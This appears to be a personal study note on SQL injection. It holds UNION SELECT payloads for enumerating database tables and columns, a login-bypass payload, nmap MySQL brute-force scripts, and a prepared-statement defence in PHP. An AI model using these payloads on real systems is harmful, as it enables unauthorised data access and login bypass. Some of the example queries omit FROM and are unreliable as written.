# SQL injection basics

## Find number of return parameters

SELECT 1,2,3 #

Add or remove parameters until there is no more error
Comment at the end could be needed depending on place the injection is added


## Get table names

https://domain/path/-1 UNION SELECT table_schema,table_name FROM INFORMATION_SCHEMA.tables LIMIT 0,1

## Get columns

https://domain/path/-1 UNION SELECT table_name,column_name INFORMATION_SCHEMA.columns LIMIT 480,1


Or for a specific table:

https://domain/path/-1 UNION SELECT table_name,column_name INFORMATION_SCHEMA.columns WHERE table_name='name' LIMIT 0,1

Get number of columns:



SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS
 WHERE table_catalog = 'database_name' -- the database
   AND table_name = 'table_name'




## Get specific column entry

SELECT column FROM table LIMIT 0,1

## Entry fields (not url parameters)

* First terminate with " or '
* Also maybe at space + # to the end of the query

### Login

Either the pwd field or the login can be SQL-ed.

If the server SQL syntax is something like

SELECT * FROM users WHERE username = 'a' AND password ='b'

go for something like as password:
' UNION SELECT 1,2 #

The ' closes the SQL request. The returned constants by SELECT are used as valid login. The comment at the end removes potential leftovers fromt he original SQL statement

## Tools

Extensions:

* Tamper data
* https://addons.mozilla.org/en-US/firefox/addon/tamper-data-for-ff-quantum/?src=search

Burp suite as proxy

* Foxy proxy is a good addition to switch proxies

## Protection

Use *prepared statements*

https://www.php.net/manual/en/mysqli.quickstart.prepared-statements.php

{lang="php"}
    $sql = new mysqli("host", "username", "password", "database");
    $q = $sql->prepare("SELECT title, message FROM pages WHERE id = (?)");  // (?) will be defined with the bind next line
    $q->bind_param("i", $id);   // id must be integer
    $q->execute();    // execute the request
    $q->bind_result($title, $message);  // Bind the output variables
    $q->fetch();  // Fetch the data, can be in a loop
    print "<h2>" . $title . "</h2>" . $message;

## MySQL enumeration using nmap

nmap does support mysql by scripts.

* mysql-info: basic information. version, capabilities
* mysql-enum: enumerate user accounts
* mysql-brute: brute forces access to the mysql db
* mysql-empty-password: Check for user accounts with empty passwords


## Further reading

### SQL injection attacks and defense

https://learning.oreilly.com/library/view/sql-injection-attacks/9781597499637


%% TODO: SQL injection cheat sheet: https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/


%% TODO check tool sqlmap